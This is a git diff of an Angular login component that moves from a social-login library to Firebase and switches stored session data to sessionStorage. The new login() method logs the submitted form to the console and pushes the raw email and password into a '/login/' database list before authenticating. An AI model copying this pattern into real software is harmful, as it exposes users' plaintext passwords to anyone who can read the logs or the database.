@@ -2,7 +2,8 @@ import { Component, OnInit } from '@angular/core';
 import { NgForm } from '@angular/forms';
 import { Router } from '@angular/router';
 import { AuthService } from '../services/auth.service';
-import { GoogleLoginProvider, SocialAuthService } from 'angularx-social-login';
+import { AngularFireDatabase } from '@angular/fire/database';
+import { AngularFireAuth } from '@angular/fire/auth';
 
 @Component({
   selector: 'app-login-user',
@@ -10,6 +11,7 @@ import { GoogleLoginProvider, SocialAuthService } from 'angularx-social-login';
   styleUrls: ['./login-user.component.css']
 })
 export class LoginUserComponent implements OnInit {
+
   email = "";
   password = "";
   errorMessage = ''; // validation error handle
@@ -17,12 +19,14 @@ export class LoginUserComponent implements OnInit {
 
   constructor(private authservice: AuthService,
     private router: Router,
-    private authService: SocialAuthService) { }
-    
+    private db: AngularFireDatabase,
+    public afAuth: AngularFireAuth) { }
+
   ngOnInit() {
-    if (localStorage.getItem('email')?.length && localStorage.getItem('uid')?.length) {
+    if (sessionStorage.getItem('email')?.length && sessionStorage.getItem('uid')?.length) {
       this.router.navigate(['/home']);
     }
+
   }
 
   clearErrorMessage() {
@@ -32,12 +36,15 @@ export class LoginUserComponent implements OnInit {
 
   // signInHandler(): void {
   //   this.authService.signIn(GoogleLoginProvider.PROVIDER_ID).then((data: any) => {
-  //     localStorage.setItem('google_auth', JSON.stringify(data));
+  //    sessionStorage.setItem('google_auth', JSON.stringify(data));
   //     this.router.navigateByUrl('/home').then();
   //   });
   // }
 
-  login() {
+  login(form: NgForm) {
+    console.log(form.value);
+    this.db.list('/login/')
+      .push({ ...form.value });
     this.clearErrorMessage();
     if (this.validateForm(this.email, this.password)) {
       this.authservice.loginWithEmail(this.email, this.password)
@@ -68,7 +75,6 @@ export class LoginUserComponent implements OnInit {
 
     this.errorMessage = '';
     return true;
-
   }
 
 }
